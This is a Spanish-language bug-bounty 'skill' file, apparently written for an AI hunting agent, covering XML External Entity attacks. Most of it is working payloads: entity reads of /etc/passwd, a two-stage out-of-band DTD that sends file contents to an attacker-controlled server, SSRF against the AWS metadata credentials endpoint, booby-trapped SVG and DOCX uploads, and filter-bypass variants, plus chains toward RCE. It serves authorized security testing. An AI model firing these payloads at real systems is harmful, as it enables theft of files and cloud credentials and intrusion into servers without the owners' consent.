---
name: hunt-xxe
description: Hunting skill para XXE (XML External Entity) — file read in-band, blind OOB via DTD callback, SSRF via XXE, XXE en file upload (SVG/DOCX/XLSX/PPTX), SAML XXE, y chains hacia RCE. Usar cuando el target procesa XML — endpoints SOAP/REST que aceptan XML, file upload de documentos, SAML/SSO.
sources: elementalsouls/Claude-BugHunter (hunt-xxe), hackerone_public, assetnote_research
---

## Qué es esto y qué NO es

XXE = el parser XML del servidor procesa una entidad externa definida por el atacante, lo que le permite leer archivos locales, hacer requests internas (SSRF), o exfiltrar datos via OOB.

**No es**: cualquier endpoint que acepta XML. El parser tiene que resolver entidades externas — la mayoría de parsers modernos lo tienen deshabilitado. Hacé el probe inline primero.

---

## Conocimiento previo

Use the `hexbrain` skill for relevant public prior art when it can change the test plan; verify any lead against primary sources and target evidence.

---

## Gate de Confirmación — no negociable

**Pre-severity gate: probe inline primero.**
Antes de invertir tiempo en SYSTEM/OOB, enviá una entidad inline inofensiva:
```xml
<!DOCTYPE foo [<!ENTITY hello "world">]><root><data>&hello;</data></root>
```
Si `world` NO aparece en la respuesta → expansión de entidades deshabilitada → el parser está endurecido. Pivoteá a otra superficie, no sigas con XXE.

**Para reportar necesitás demostrar:**
- Contenido de `/etc/passwd` o `C:\Windows\win.ini` en la respuesta (in-band), O
- Callback OOB confirmado con datos del archivo exfiltrado, O
- Acceso a endpoint interno via SSRF (metadata AWS, admin interno)

Un callback DNS sin datos exfiltrados = Low/Medium informational, no Critical.

---

## Matrix de parsers — fingerprint antes de invertir tiempo

| Parser | Vulnerable por default? |
|---|---|
| Java SAX/DOM (`XMLInputFactory` sin deshabilitar) | **SÍ** |
| Java JAXB/JAX-WS (Spring antiguo) | **SÍ** |
| PHP `DOMDocument` con `LIBXML_NOENT` | **SÍ** |
| PHP `simplexml_load_*` con `LIBXML_NOENT` | **SÍ** |
| .NET `XmlDocument` con `XmlResolver` explícito | **SÍ** |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | NO |
| Python `lxml` moderna | NO (para file read; puede hacer fetch de red si `no_network=False`) |
| Ruby Nokogiri default | NO |
| Ruby Nokogiri con `DTDLOAD` habilitado | **SÍ** |
| Apache Struts (versiones viejas) | **SÍ** |

**Signals de stack vulnerable:**
- `Server: Apache Tomcat` / `X-Powered-By: Servlet` → Java backend → **probable SÍ**
- `X-Powered-By: PHP` + endpoint que ingesta XML → **probable SÍ**
- `Server: Microsoft-IIS` con `.aspx` + SOAP → **probable SÍ**

---

## Señales de superficie de ataque

**URL patterns:**
```
/api/*/xml    /upload    /import    /parse    /convert
/saml/acs     /sso/saml  /feed      /rss      /sitemap
/webdav       /soap/*    /wsdl      /service.asmx    /xmlrpc
```

**Content-Type headers que indican XML:**
```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: multipart/form-data  ← buscar file upload fields
```

**File upload features a testear:**
SVG, DOCX, XLSX, PPTX, PDF (con XML embebido)

**Tech stack signals en JS:**
```javascript
XMLSerializer  DOMParser  parseFromString
new ActiveXObject("Microsoft.XMLDOM")
xml2js  libxmljs  lxml
```

---

## Metodología

### Paso 1 — Mapear entry points XML
Burp passive scan para flaggear requests/responses con content-types XML. También interceptar endpoints JSON y cambiar `Content-Type` a `application/xml` con body XML equivalente — algunos backends aceptan ambos.

### Paso 2 — Probe inline (obligatorio primero)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY hello "world">]>
<root><data>&hello;</data></root>
```
Si `world` aparece → entidades habilitadas → continuá con SYSTEM.
Si no → parser endurecido → no sigas con XXE en este endpoint.

### Paso 3 — File read in-band
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

Windows:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
```

### Paso 4 — Si no hay reflexión: Blind OOB
Configurar listener (Burp Collaborator / interactsh):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLAB.net/xxe-test">]>
<root><data>&xxe;</data></root>
```

### Paso 5 — Blind OOB con exfiltración de archivo (dos etapas)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://TU-SERVIDOR/evil.dtd">
  %dtd;
]>
<root><data>trigger</data></root>
```

**evil.dtd en tu servidor:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://TU-SERVIDOR/?data=%file;'>">
%all;
```

### Paso 6 — SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&ssrf;</data></root>
```

### Paso 7 — SVG upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

### Paso 8 — DOCX/XLSX (modificar `[Content_Types].xml` dentro del ZIP)
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```

### Paso 9 — JSON → XML content-type swap
```bash
# Request JSON original
curl -X POST https://target.com/api/endpoint -H "Content-Type: application/json" -d '{"user":"test"}'

# Convertido a XML para testear XXE
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLAB.net">]><user>&xxe;</user>'
```

---

## Bypass techniques

**Si OOB está bloqueado — error-based via local DTD:**
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
    %eval; %err;'>
  %local_dtd; ]>
```
Zero network egress. Paths de DTD locales varían por distro.

**Si `file://` está bloqueado:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">       <!-- Java -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">   <!-- Java -->
```

**Si las keywords están blacklisteadas:**
```xml
<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>
```
O encoding UTF-16 del payload completo.

---

## Root causes comunes

1. Configuraciones de parser por default — Java `DocumentBuilderFactory`, PHP `DOMDocument`, Ruby Nokogiri antiguo
2. XML oculto — libraries como Apache POI, python-docx procesan formatos que son XML containers
3. SAML/SSO — integración delega parsing a libraries sin revisar configuración XXE
4. Endpoints JSON con parsing XML interno no documentado
5. Copy-paste de StackOverflow sin `setFeature("...GENERAL_ENTITIES", false)`

---

## Chains y skills relacionadas

- **`ssrf`** — XXE es SSRF con sintaxis XML. `gopher://` via XXE puede alcanzar Redis/SMTP cuando SSRF puro está filtrado
- **`file-upload`** — XXE más frecuente en DOCX/XLSX/PPTX/SVG/GPX → chain: upload con DTD malicioso → OOB file read de `/etc/passwd` / `.aws/credentials`
- **`hunt-rce`** — PHP con `expect://`, Java con XSLT extensions, Adobe Commerce CVE-2024-34102 (XXE → deserialization → RCE). Raro pero real
- **`saml-auth-bypass`** — SAML assertions son XML-based; testear XXE en `saml/acs` endpoint siempre
